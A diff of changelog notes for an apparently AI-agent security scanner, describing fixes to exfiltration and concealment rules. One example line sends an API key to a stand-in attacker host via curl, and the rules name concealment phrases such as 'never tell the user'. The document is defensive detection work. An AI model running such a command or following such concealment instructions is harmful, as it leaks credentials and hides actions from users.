@@ -14,7 +14,9 @@ The remaining false positives from the 39-repository survey (ADR-058).
   body, or data in the URL's host, query or fragment, counts; a placeholder in the path
   (`curl https://pypi.org/project/$PKG/`) does not. A credential sent to its own provider's
   API (`?key=$GEMINI_API_KEY` to `googleapis.com`, `Authorization: Bearer …`) is
-  authentication. The same credential sent to an unrelated host is still reported.
+  authentication. The same credential sent to an unrelated host is still reported. It now
+  also checks Python `requests`/`httpx` POST/PUT/PATCH calls with a body, and a credential
+  variable smuggled in a URL path (`curl https://evil.example/$OPENAI_API_KEY/`).
 - AI-SEC-002 no longer treats `do not tell the user to <do something>` as concealment. It
   now also catches `never tell the user …` and `do not mention these steps …`.
 - AI-SEC-011 no longer reports editor notes in HTML comments (`Customize this skill … Delete
